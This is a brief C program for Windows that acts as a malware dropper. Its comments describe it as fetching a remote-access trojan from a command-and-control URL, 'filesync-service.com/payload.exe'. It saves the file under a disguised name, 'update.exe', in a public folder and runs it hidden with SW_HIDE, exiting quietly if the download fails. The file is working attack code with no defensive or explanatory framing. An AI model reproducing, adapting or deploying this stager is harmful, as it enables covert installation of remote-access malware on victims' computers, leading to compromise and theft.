#include <windows.h>
#include <urlmon.h>   // For URLDownloadToFile
#pragma comment(lib, "urlmon.lib")

int main() {
    // Step 1: Define the C2 URL where the full RAT is hosted
    const char* payloadUrl = "http://filesync-service.com/payload.exe";

    // Step 2: Define a hidden location to save it
    const char* savePath = "C:\\Users\\Public\\update.exe";

    // Step 3: Download the RAT from the internet
    HRESULT hr = URLDownloadToFileA(NULL, payloadUrl, savePath, 0, NULL);

    if (SUCCEEDED(hr)) {
        // Step 4: Run the downloaded payload silently
        ShellExecuteA(NULL, "open", savePath, NULL, NULL, SW_HIDE);
    } else {
        // Fallback: do nothing, exit quietly
    }

    return 0;
}
